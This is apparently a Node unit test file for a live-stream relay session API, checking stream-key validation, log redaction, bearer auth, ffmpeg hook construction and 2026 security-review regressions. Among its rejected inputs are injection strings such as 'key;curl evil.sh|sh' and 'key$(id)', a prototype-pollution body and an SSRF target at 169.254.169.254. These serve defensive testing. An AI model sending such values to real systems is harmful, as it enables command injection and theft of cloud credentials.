/**
 * Unit tests for the LIVETAP relay session API.
 * Run with:  node --test infra/relay/session-api/
 *
 * No vitest here on purpose: infra/ must be runnable with a bare Node 20 and
 * no workspace install.
 */

import test from 'node:test';
import assert from 'node:assert/strict';

import {
  validateIngest,
  validateRequest,
  redactIngest,
  composeRtmpPublishUrl,
  buildHookCommand,
  loadConfig,
  isAuthorized,
  newSessionId,
  SESSION_ID_RE,
  createServer,
  shQuote,
  isPrivateDestinationHost,
  destinationHost,
} from './relay-session.mjs';

const ENV = {
  MTX_PUBLISH_PASSWORD: 'pub-secret',
  MTX_API_PASSWORD: 'api-secret',
  MTX_HOOK_PASSWORD: 'hook-secret',
  LIVETAP_RELAY_PUBLIC_HOST: 'relay.example.com',
};

const cfg = loadConfig(ENV);
const cfgVertical = loadConfig({ ...ENV, LIVETAP_ENABLE_VERTICAL_TRANSCODE: '1' });
// SEC-R3 added an SSRF gate that refuses private/loopback/bare-hostname
// destinations by default. Fixtures below that deliberately publish to
// 127.0.0.1 (the local RTMP diagnostics target) opt out explicitly.
const cfgPrivateOk = loadConfig({ ...ENV, LIVETAP_RELAY_ALLOW_PRIVATE_DESTINATIONS: '1' });
const cfgVerticalPrivateOk = loadConfig({
  ...ENV,
  LIVETAP_ENABLE_VERTICAL_TRANSCODE: '1',
  LIVETAP_RELAY_ALLOW_PRIVATE_DESTINATIONS: '1',
});

// ---------------------------------------------------------------------------
// validateIngest — must match packages/core/src/validation/ingest.ts
// ---------------------------------------------------------------------------

test('validateIngest accepts the shapes core accepts', () => {
  assert.equal(validateIngest({ protocol: 'rtmp', url: 'rtmp://live.twitch.tv/app', streamKey: 'live_123_abc' }).ok, true);
  assert.equal(validateIngest({ protocol: 'rtmps', url: 'rtmps://a.rtmps.youtube.com/live2', streamKey: 'abcd-efgh' }).ok, true);
  assert.equal(validateIngest({ protocol: 'srt', url: 'srt://ingest.example.com:9000?streamid=abc' }).ok, true);
  assert.equal(validateIngest({ protocol: 'whip', url: 'https://relay.example.com/whip/abc' }).ok, true);
});

test('validateIngest rejects the shapes core rejects', () => {
  assert.equal(validateIngest(undefined).ok, false);
  assert.ok(validateIngest({ protocol: 'rtmp', url: '', streamKey: 'x' }).errors.includes('Stream URL is required.'));
  assert.equal(validateIngest({ protocol: 'rtmp', url: 'http://nope', streamKey: 'x' }).ok, false);
  assert.equal(validateIngest({ protocol: 'rtmps', url: 'rtmp://insecure/app', streamKey: 'x' }).ok, false);
  assert.equal(validateIngest({ protocol: 'rtmp', url: 'rtmp://host/app' }).ok, false, 'missing stream key');
  assert.equal(validateIngest({ protocol: 'nope', url: 'rtmp://host/app' }).ok, false);
});

// This is the security test that matters most: MediaMTX runs the hook through
// `sh -c`, so these characters must never survive validation.
test('validateIngest blocks shell metacharacters in stream keys', () => {
  for (const evil of [
    'key;curl evil.sh|sh',
    'key`id`',
    'key$(id)',
    'key with space',
    'key"quote',
    "key'quote",
    'key|pipe',
    'key&background',
    'key<in',
    'key>out',
  ]) {
    const r = validateIngest({ protocol: 'rtmp', url: 'rtmp://host/app', streamKey: evil });
    assert.equal(r.ok, false, `should reject stream key: ${evil}`);
    assert.ok(
      r.errors.some((e) => e.includes('not allowed')),
      `should flag disallowed characters for: ${evil}`,
    );
  }
});

test('validateIngest blocks shell metacharacters in URLs', () => {
  const r = validateIngest({ protocol: 'rtmp', url: 'rtmp://host/app;id', streamKey: 'ok' });
  assert.equal(r.ok, false);
});

// ---------------------------------------------------------------------------
// redaction
// ---------------------------------------------------------------------------

test('redactIngest never exposes a full stream key', () => {
  const r = redactIngest({ protocol: 'rtmp', url: 'rtmp://host/app', streamKey: 'supersecretkey1234' });
  assert.equal(r.streamKey, '••••1234');
  assert.ok(!JSON.stringify(r).includes('supersecretkey'));
});

test('redactIngest tolerates a missing key', () => {
  assert.equal(redactIngest({ protocol: 'srt', url: 'srt://h:9000' }).streamKey, undefined);
});

// ---------------------------------------------------------------------------
// URL composition
// ---------------------------------------------------------------------------

test('composeRtmpPublishUrl joins without a double slash', () => {
  assert.equal(
    composeRtmpPublishUrl({ protocol: 'rtmp', url: 'rtmp://host/app/', streamKey: 'k' }),
    'rtmp://host/app/k',
  );
  assert.equal(
    composeRtmpPublishUrl({ protocol: 'rtmps', url: 'rtmps://host/live2', streamKey: 'k' }),
    'rtmps://host/live2/k',
  );
  assert.equal(composeRtmpPublishUrl({ protocol: 'srt', url: 'srt://h:9000' }), 'srt://h:9000');
});

// ---------------------------------------------------------------------------
// hook construction
// ---------------------------------------------------------------------------

const twoFlat = [
  { protocol: 'rtmp', url: 'rtmp://127.0.0.1:19351/live', streamKey: 'a', aspectRatio: '16:9' },
  { protocol: 'rtmps', url: 'rtmps://a.rtmp.youtube.com/live2', streamKey: 'yt-key', aspectRatio: '16:9' },
];

test('hook copies video and transcodes audio to AAC', () => {
  const cmd = buildHookCommand('sess1', twoFlat, cfg);
  assert.match(cmd, /-c:v copy/);
  assert.match(cmd, /-c:a aac/);
  assert.ok(!cmd.includes('-c:a copy'), 'audio must never be copied: WHIP delivers Opus, RTMP needs AAC');
});

test('hook fans out to every destination through one tee', () => {
  const cmd = buildHookCommand('sess1', twoFlat, cfg);
  assert.match(cmd, /rtmp:\/\/127\.0\.0\.1:19351\/live\/a/);
  assert.match(cmd, /rtmps:\/\/a\.rtmp\.youtube\.com\/live2\/yt-key/);
  assert.equal((cmd.match(/onfail=ignore/g) || []).length, 2, 'each destination must fail independently');
  assert.equal((cmd.match(/-f tee/g) || []).length, 1, 'one output group for flat destinations');
});

/*
 * TWO ACCOUNTS ON ONE PLATFORM, THROUGH ONE SESSION.
 *
 * Two YouTube channels are the same ingest URL with two different stream keys. Every layer above
 * this one has already had a bug of exactly this shape: the store reconnected the first channel
 * instead of authorizing a second, the token store answered Carter Live's request with Carter
 * Gaming's token, and a refresh renewed the wrong grant. In each case the identity stopped at a
 * seam and the collapse looked completely correct from outside — two rows, two labels, both green,
 * one channel receiving video.
 *
 * The relay is the last seam, and the one where a collapse would be hardest to see: the forward
 * list is an ffmpeg tee argument that nobody reads. So it is asserted here rather than assumed
 * from the fact that `.map()` was used.
 */
test('hook forwards to two accounts on one platform as two separate targets', () => {
  const twoChannels = [
    { protocol: 'rtmps', url: 'rtmps://a.rtmp.youtube.com/live2', streamKey: 'gaming-key', aspectRatio: '16:9' },
    { protocol: 'rtmps', url: 'rtmps://a.rtmp.youtube.com/live2', streamKey: 'live-key', aspectRatio: '16:9' },
  ];
  const cmd = buildHookCommand('sess1', twoChannels, cfg);

  assert.match(cmd, /rtmps:\/\/a\.rtmp\.youtube\.com\/live2\/gaming-key/);
  assert.match(cmd, /rtmps:\/\/a\.rtmp\.youtube\.com\/live2\/live-key/);
  assert.equal(
    (cmd.match(/onfail=ignore/g) || []).length,
    2,
    'the two channels collapsed into one forward target: one of them receives nothing',
  );
});

/* The same case must survive validation, which is where a dedupe would most plausibly be added. */
test('two accounts on one platform are accepted, not deduplicated by URL', () => {
  const res = validateRequest(
    {
      destinations: [
        { protocol: 'rtmps', url: 'rtmps://a.rtmp.youtube.com/live2', streamKey: 'gaming-key' },
        { protocol: 'rtmps', url: 'rtmps://a.rtmp.youtube.com/live2', streamKey: 'live-key' },
      ],
    },
    cfg,
  );
  assert.equal(res.ok, true, res.errors.join('; '));
  assert.equal(res.destinations.length, 2);
});

test('hook reads back over loopback RTSP with the hook credential', () => {
  const cmd = buildHookCommand('sess1', twoFlat, cfg);
  assert.match(cmd, /rtsp:\/\/relayhook:hook-secret@127\.0\.0\.1:\$RTSP_PORT\/\$MTX_PATH/);
});

// `onfail=ignore` alone would drop a destination for the rest of the broadcast.
// The fifo options are what actually reconnect it (verified end-to-end: a
// destination was killed and restarted mid-stream and recovered on its own).
test('hook enables per-destination reconnect and backpressure dropping', () => {
  const cmd = buildHookCommand('sess1', twoFlat, cfg);
  assert.match(cmd, /-use_fifo 1/);
  assert.match(cmd, /attempt_recovery=1/);
  assert.match(cmd, /recovery_wait_time=1/);
  assert.match(cmd, /recover_any_error=1/);
  // Mandatory backpressure guard (ADR-005): a stalled destination must drop
  // packets, never stall the ingest.
  assert.match(cmd, /drop_pkts_on_overflow=1/);
});

test('the vertical output group gets the same reconnect treatment', () => {
  const cmd = buildHookCommand('s', [
    { protocol: 'rtmp', url: 'rtmp://tiktok/live', streamKey: 'tk', aspectRatio: '9:16' },
  ], cfgVertical);
  assert.match(cmd, /-use_fifo 1/);
  assert.match(cmd, /drop_pkts_on_overflow=1/);
});

test('hook suppresses non-monotonic DTS from the WebRTC source', () => {
  const cmd = buildHookCommand('sess1', twoFlat, cfg);
  assert.match(cmd, /-fflags \+genpts/);
  assert.match(cmd, /-max_interleave_delta 0/);
});

test('hook adds a second output group only for 9:16 destinations', () => {
  const mixed = [
    ...twoFlat,
    { protocol: 'rtmp', url: 'rtmp://tiktok/live', streamKey: 'tk', aspectRatio: '9:16' },
  ];
  const flatOnly = buildHookCommand('s', twoFlat, cfgVertical);
  assert.ok(!flatOnly.includes('libx264'), 'no re-encode when nothing is vertical');

  const cmd = buildHookCommand('s', mixed, cfgVertical);
  assert.match(cmd, /crop=ih\*9\/16:ih,scale=1080:1920/);
  assert.match(cmd, /-c:v libx264/);
  assert.equal((cmd.match(/-f tee/g) || []).length, 2, 'flat group + vertical group');
  // The vertical destination must not also appear in the copy group.
  const [flatGroup] = cmd.split('-filter:v');
  assert.ok(!flatGroup.includes('rtmp://tiktok/live/tk'));
});

test('a vertical-only session produces no copy group', () => {
  const cmd = buildHookCommand('s', [
    { protocol: 'rtmp', url: 'rtmp://tiktok/live', streamKey: 'tk', aspectRatio: '9:16' },
  ], cfgVertical);
  assert.equal((cmd.match(/-f tee/g) || []).length, 1);
  assert.match(cmd, /-c:v libx264/);
});

// ---------------------------------------------------------------------------
// request validation
// ---------------------------------------------------------------------------

test('validateRequest requires at least one destination', () => {
  assert.equal(validateRequest({}, cfg).ok, false);
  assert.equal(validateRequest({ destinations: [] }, cfg).ok, false);
  assert.equal(validateRequest(null, cfg).ok, false);
});

test('validateRequest caps the destination count', () => {
  const many = Array.from({ length: 11 }, () => twoFlat[0]);
  assert.equal(validateRequest({ destinations: many }, cfg).ok, false);
});

test('validateRequest refuses 9:16 unless the relay enables re-encoding', () => {
  const body = { destinations: [{ protocol: 'rtmp', url: 'rtmp://h.example/live', streamKey: 'k', aspectRatio: '9:16' }] };
  const off = validateRequest(body, cfg);
  assert.equal(off.ok, false);
  assert.ok(off.errors.some((e) => e.includes('LIVETAP_ENABLE_VERTICAL_TRANSCODE')));
  assert.equal(validateRequest(body, cfgVertical).ok, true);
  assert.equal(validateRequest(body, cfgVerticalPrivateOk).ok, true);
});

test('validateRequest refuses SRT and WHIP destinations', () => {
  assert.equal(validateRequest({ destinations: [{ protocol: 'srt', url: 'srt://h:9000' }] }, cfg).ok, false);
  assert.equal(validateRequest({ destinations: [{ protocol: 'whip', url: 'https://h/whip' }] }, cfg).ok, false);
});

test('validateRequest rejects an unknown aspect ratio', () => {
  const body = { destinations: [{ protocol: 'rtmp', url: 'rtmp://h.example/live', streamKey: 'k', aspectRatio: '4:3' }] };
  assert.equal(validateRequest(body, cfg).ok, false);
});

test('validation errors never echo the stream key back', () => {
  const body = { destinations: [{ protocol: 'rtmp', url: 'rtmp://h.example/live', streamKey: 'bad;key' }] };
  const r = validateRequest(body, cfg);
  assert.equal(r.ok, false);
  assert.ok(!JSON.stringify(r.errors).includes('bad;key'));
});

// ---------------------------------------------------------------------------
// auth
// ---------------------------------------------------------------------------

test('isAuthorized accepts only the exact bearer token', () => {
  assert.equal(isAuthorized({ headers: { authorization: 'Bearer pub-secret' } }, cfg), true);
  assert.equal(isAuthorized({ headers: { authorization: 'Bearer wrong' } }, cfg), false);
  assert.equal(isAuthorized({ headers: { authorization: 'Basic pub-secret' } }, cfg), false);
  assert.equal(isAuthorized({ headers: {} }, cfg), false);
  assert.equal(isAuthorized({ headers: { authorization: 'Bearer ' } }, cfg), false);
});

test('loadConfig demands every secret', () => {
  for (const missing of ['MTX_PUBLISH_PASSWORD', 'MTX_API_PASSWORD', 'MTX_HOOK_PASSWORD', 'LIVETAP_RELAY_PUBLIC_HOST']) {
    const env = { ...ENV };
    delete env[missing];
    assert.throws(() => loadConfig(env), new RegExp(missing));
  }
});

test('session ids are opaque and path-safe', () => {
  for (let i = 0; i < 20; i++) assert.match(newSessionId(), SESSION_ID_RE);
});

// ---------------------------------------------------------------------------
// server behaviour (fake MediaMTX)
// ---------------------------------------------------------------------------

function withServer(t, cfgUsed, mtx, fn) {
  const logs = [];
  const log = { info: (m) => logs.push(m), error: (m) => logs.push(m) };
  const server = createServer(cfgUsed, mtx, log);
  return new Promise((resolve, reject) => {
    server.listen(0, async () => {
      const base = `http://127.0.0.1:${server.address().port}`;
      try {
        await fn(base, logs);
        resolve();
      } catch (e) {
        reject(e);
      } finally {
        server.close();
      }
    });
  });
}

const AUTH = { Authorization: 'Bearer pub-secret', 'Content-Type': 'application/json' };

test('POST /sessions creates a path and returns a WHIP URL', async (t) => {
  const calls = [];
  const mtx = {
    addPath: async (name, conf) => { calls.push({ name, conf }); },
    deletePath: async () => {},
  };
  await withServer(t, cfgPrivateOk, mtx, async (base) => {
    const res = await fetch(`${base}/sessions`, {
      method: 'POST', headers: AUTH, body: JSON.stringify({ destinations: twoFlat }),
    });
    assert.equal(res.status, 201);
    const body = await res.json();
    assert.match(body.sessionId, SESSION_ID_RE);
    assert.equal(body.whipUrl, `http://relay.example.com:18889/live/${body.sessionId}/whip`);
    assert.equal(body.whipAuthorization, 'livetap:pub-secret');

    assert.equal(calls.length, 1);
    assert.equal(calls[0].name, `live/${body.sessionId}`);
    assert.deepEqual(calls[0].conf.forward, [], 'native forward must stay empty');
    assert.match(calls[0].conf.runOnAvailable, /-c:a aac/);
    assert.equal(calls[0].conf.runOnAvailableRestart, true);
  });
});

test('stream keys never reach the logs', async (t) => {
  const mtx = { addPath: async () => {}, deletePath: async () => {} };
  await withServer(t, cfgPrivateOk, mtx, async (base, logs) => {
    await fetch(`${base}/sessions`, {
      method: 'POST', headers: AUTH, body: JSON.stringify({ destinations: twoFlat }),
    });
    const all = logs.join('\n');
    assert.ok(all.length > 0, 'something should have been logged');
    assert.ok(!all.includes('yt-key'), 'YouTube stream key leaked into logs');
    assert.ok(all.includes('••••'), 'log should carry the redacted form');
  });
});

test('unauthenticated requests get 401 and create nothing', async (t) => {
  let called = false;
  const mtx = { addPath: async () => { called = true; }, deletePath: async () => {} };
  await withServer(t, cfgPrivateOk, mtx, async (base) => {
    const res = await fetch(`${base}/sessions`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ destinations: twoFlat }),
    });
    assert.equal(res.status, 401);
    assert.equal(called, false);
  });
});

test('invalid destinations get 400 and create nothing', async (t) => {
  let called = false;
  const mtx = { addPath: async () => { called = true; }, deletePath: async () => {} };
  await withServer(t, cfgPrivateOk, mtx, async (base) => {
    const res = await fetch(`${base}/sessions`, {
      method: 'POST', headers: AUTH,
      body: JSON.stringify({ destinations: [{ protocol: 'rtmp', url: 'rtmp://h.example/live', streamKey: 'evil;id' }] }),
    });
    assert.equal(res.status, 400);
    assert.equal(called, false);
    const body = await res.json();
    assert.ok(Array.isArray(body.details));
  });
});

test('DELETE /sessions/:id removes the path', async (t) => {
  const deleted = [];
  const mtx = { addPath: async () => {}, deletePath: async (n) => { deleted.push(n); } };
  await withServer(t, cfgPrivateOk, mtx, async (base) => {
    const res = await fetch(`${base}/sessions/abcdef0123456789`, {
      method: 'DELETE', headers: { Authorization: 'Bearer pub-secret' },
    });
    assert.equal(res.status, 204);
    assert.deepEqual(deleted, ['live/abcdef0123456789']);
  });
});

test('DELETE rejects a malformed session id without calling MediaMTX', async (t) => {
  let called = false;
  const mtx = { addPath: async () => {}, deletePath: async () => { called = true; } };
  await withServer(t, cfgPrivateOk, mtx, async (base) => {
    for (const bad of ['../../config', 'short', 'has%20space']) {
      const res = await fetch(`${base}/sessions/${bad}`, {
        method: 'DELETE', headers: { Authorization: 'Bearer pub-secret' },
      });
      assert.ok(res.status === 400 || res.status === 404, `expected rejection for ${bad}, got ${res.status}`);
    }
    assert.equal(called, false);
  });
});

test('DELETE of an unknown session returns 404', async (t) => {
  const mtx = {
    addPath: async () => {},
    deletePath: async () => { const e = new Error('nope'); e.status = 404; throw e; },
  };
  await withServer(t, cfgPrivateOk, mtx, async (base) => {
    const res = await fetch(`${base}/sessions/abcdef0123456789`, {
      method: 'DELETE', headers: { Authorization: 'Bearer pub-secret' },
    });
    assert.equal(res.status, 404);
  });
});

test('a MediaMTX failure becomes a 500 that leaks nothing', async (t) => {
  const mtx = {
    addPath: async () => { throw new Error('MediaMTX API POST /v3/... failed: 500'); },
    deletePath: async () => {},
  };
  await withServer(t, cfgPrivateOk, mtx, async (base) => {
    const res = await fetch(`${base}/sessions`, {
      method: 'POST', headers: AUTH, body: JSON.stringify({ destinations: twoFlat }),
    });
    assert.equal(res.status, 500);
    const body = await res.json();
    assert.equal(body.error, 'Relay error.');
    assert.ok(!JSON.stringify(body).includes('yt-key'));
  });
});

test('GET /healthz needs no auth', async (t) => {
  const mtx = { addPath: async () => {}, deletePath: async () => {} };
  await withServer(t, cfgPrivateOk, mtx, async (base) => {
    const res = await fetch(`${base}/healthz`);
    assert.equal(res.status, 200);
    assert.deepEqual(await res.json(), { ok: true });
  });
});

// ---------------------------------------------------------------------------
// SECURITY REVIEW 2026-09 — regression tests for SEC-R1/R2/R3.
// Every test below FAILED against the pre-review code.
// ---------------------------------------------------------------------------

const BACKSLASH = String.fromCharCode(92);
const TAB = String.fromCharCode(9);
const NEWLINE = String.fromCharCode(10);

test('SEC-R1 rejects a stream key ending in a backslash (sh quote desynchronisation)', () => {
  const res = validateIngest({
    protocol: 'rtmp',
    url: 'rtmp://a.example/app',
    streamKey: 'KEY' + BACKSLASH,
  });
  assert.equal(res.ok, false);
  assert.ok(res.errors.some((e) => /not allowed/.test(e)), res.errors.join(' / '));
});

test('SEC-R1 rejects shell and glob metacharacters the old deny-list let through', () => {
  for (const key of ['KEY' + BACKSLASH, 'KEY(x)', 'KEY{x}', 'KEY*', 'KEY?', 'KEY^', 'KEY[a]']) {
    const res = validateIngest({ protocol: 'rtmp', url: 'rtmp://a.example/app', streamKey: key });
    assert.equal(res.ok, false, 'expected refusal for ' + JSON.stringify(key));
  }
});

test('SEC-R1 the generated hook command is a balanced sh command with quoted values', () => {
  const hook = buildHookCommand(
    'sid',
    [
      { protocol: 'rtmp', url: 'rtmp://a.example/app', streamKey: 'K1', aspectRatio: '16:9' },
      { protocol: 'rtmp', url: 'rtmp://b.example/app', streamKey: 'K2', aspectRatio: '9:16' },
    ],
    cfgVertical,
  );
  assert.equal((hook.match(/'/g) ?? []).length % 2, 0, 'unbalanced single quotes');
  assert.equal((hook.match(/"/g) ?? []).length % 2, 0, 'unbalanced double quotes');
  assert.ok(hook.includes("'[f=flv:onfail=ignore]rtmp://a.example/app/K1'"), hook);
  assert.ok(hook.includes("'[f=flv:onfail=ignore]rtmp://b.example/app/K2'"), hook);
  assert.ok(hook.includes("-fifo_options 'attempt_recovery=1"), hook);
  assert.ok(hook.includes('$RTSP_PORT/$MTX_PATH'), hook);
});

test('SEC-R1 shQuote makes the command structure independent of the value', () => {
  assert.equal(shQuote('plain'), "'plain'");
  assert.equal(shQuote('a;id|b$(y)'), "'a;id|b$(y)'");
  assert.equal(shQuote("it's"), "'it'" + BACKSLASH + "''s'");
});

test('SEC-R2 rejects a URL whose whitespace survives only at the edges', () => {
  for (const url of [
    'rtmp://a.example/app ',
    ' rtmp://a.example/app',
    'rtmp://a.example/app' + TAB,
    'rtmp://a.example/app' + NEWLINE,
  ]) {
    const res = validateIngest({ protocol: 'rtmp', url, streamKey: 'KEY' });
    assert.equal(res.ok, false, 'expected refusal for ' + JSON.stringify(url));
  }
});

test('SEC-R2 composeRtmpPublishUrl only ever sees a value validateIngest approved', () => {
  const d = { protocol: 'rtmp', url: 'rtmp://a.example/app ', streamKey: 'KEY' };
  assert.equal(validateIngest(d).ok, false);
  // Pre-review this destination validated ok and produced the string below.
  // A space is exactly where librtmp starts parsing tcUrl=/playpath=/conn=.
  assert.equal(composeRtmpPublishUrl(d), 'rtmp://a.example/app /KEY');
});

test('SEC-R2 non-string url/streamKey are refused, not thrown on', () => {
  for (const d of [
    { protocol: 'rtmp', url: 123, streamKey: 'KEY' },
    { protocol: 'rtmp', url: 'rtmp://a.example/app', streamKey: ['x;id'] },
    { protocol: 'rtmp', url: 'rtmp://a.example/app', streamKey: {} },
    { protocol: 'rtmp', url: { toString: 1 }, streamKey: 'KEY' },
  ]) {
    const res = validateIngest(d);
    assert.equal(res.ok, false, JSON.stringify(d));
    assert.ok(res.errors.length > 0);
  }
});

test('SEC-R2 __proto__ keys in a destination cannot pollute Object.prototype', () => {
  const body = JSON.parse(
    '{"destinations":[{"protocol":"rtmp","url":"rtmp://a.example/app","streamKey":"KEY","__proto__":{"polluted":"yes"}}]}',
  );
  validateRequest(body, cfg);
  assert.equal({}.polluted, undefined);
  assert.equal(Object.prototype.polluted, undefined);
});

test('SEC-R3 private, loopback and link-local destinations are recognised', () => {
  for (const host of [
    '127.0.0.1', '127.0.0.1:1935', 'localhost', 'mediamtx', 'mediamtx:9997',
    '10.1.2.3', '192.168.1.10', '172.16.9.9', '169.254.169.254',
    'somebox.local', 'svc.internal',
  ]) {
    assert.equal(isPrivateDestinationHost(host), true, 'expected private: ' + host);
  }
  for (const host of ['live.twitch.tv', 'a.rtmp.youtube.com', '8.8.8.8', 'ingest.example.com:1935']) {
    assert.equal(isPrivateDestinationHost(host), false, 'expected public: ' + host);
  }
});

test('SEC-R3 destinationHost extracts the authority and drops userinfo', () => {
  assert.equal(destinationHost('rtmp://live.twitch.tv/app'), 'live.twitch.tv');
  assert.equal(destinationHost('rtmps://a.example:443/app/x'), 'a.example:443');
  assert.equal(destinationHost('rtmp://user:pass@169.254.169.254/app'), '169.254.169.254');
  assert.equal(destinationHost('rtmp://h.example'), 'h.example');
});

test('SEC-R3 validateRequest refuses an SSRF destination and allows it when opted in', () => {
  const body = {
    destinations: [{ protocol: 'rtmp', url: 'rtmp://169.254.169.254/app', streamKey: 'KEY' }],
  };
  const blocked = validateRequest(body, cfg);
  assert.equal(blocked.ok, false);
  assert.ok(
    blocked.errors.some((e) => /private, loopback or link-local/.test(e)),
    blocked.errors.join(' / '),
  );
  assert.ok(!blocked.errors.join(' ').includes('169.254.169.254'));

  const opened = validateRequest(body, { ...cfg, allowPrivateDestinations: true });
  assert.equal(opened.ok, true, opened.errors.join(' / '));
});

test('SEC-R3 real platform destinations still validate end to end', () => {
  const res = validateRequest(
    {
      destinations: [
        { protocol: 'rtmps', url: 'rtmps://live.twitch.tv:443/app', streamKey: 'live_1234_abcDEF-xyz' },
        { protocol: 'rtmp', url: 'rtmp://a.rtmp.youtube.com/live2', streamKey: 'abcd-efgh-ijkl-mnop-qrst' },
      ],
    },
    cfg,
  );
  assert.equal(res.ok, true, res.errors.join(' / '));
});
